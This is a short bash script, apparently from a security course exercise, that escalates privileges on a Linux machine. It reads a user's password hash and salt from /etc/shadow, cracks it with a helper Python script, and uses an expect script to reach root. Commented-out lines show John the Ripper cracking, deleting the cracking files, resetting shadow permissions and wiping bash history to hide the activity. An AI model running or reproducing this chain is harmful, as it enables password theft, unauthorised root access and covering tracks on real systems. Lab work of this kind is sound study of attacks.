#!/usr/bin/env bash
#author: stbrb@mst.edu

#set the password for the temp employee
tempPass="correctbatteryhorsestaple99"

#grab the boss' password from the shadow file
hashedBossPass=$(grep -o "yourboss.*" "/etc/shadow" | sed 's/yourboss://g' | sed -e 's/:.*//g')
#echo $hashedBossPass

#get the salt from the boss' password
bossSalt=$(echo $hashedBossPass | cut -d'$' -f1-3)
bossSalt="${bossSalt}$" #add the end $ back on
#echo $bossSalt


#run the python script to crack the bass using crypt
bossPass=$(./crypt_breaker.py $hashedBossPass $bossSalt 2>&1)
#echo $bossPass

#echo "expect is on a 60s timeout."
#use the boss to get to root
./expect_script.sh $bossPass

cat pass.txt

rm -f pass.txt

#unshadow the password file and put the result in attempt.txt
#sudo unshadow /etc/passwd /etc/shadow > attempt.txt

#run john on the word list to brute force the password
#sudo john --wordlist=/usr/share/john/password.lst attempt.txt

#dump the results from john into a file
#sudo john --show attempt.txt > passwords.txt

#grab the sysadmin password from the file
#sysPass=$(grep -o "sysadmin.*" "passwords.txt" | sed 's/sysadmin://g' | sed -e 's/:.*//g')
#echo $sysPass

#delete john files
#sudo rm -rf /root/.john
#sudo rm -rf /home/yourboss/attempt.txt
#sudo rm -rf /home/yourboss/passwords.txt

#echo -e "$bossPass\n$sysPass"

#return shadow file permissions to default
#sudo chmod 640 /etc/shadow

#clear the terminal of output
#clear
#cat /dev/null > ~/.bash_history && history -c && history -w	
#rm -f .bash_history
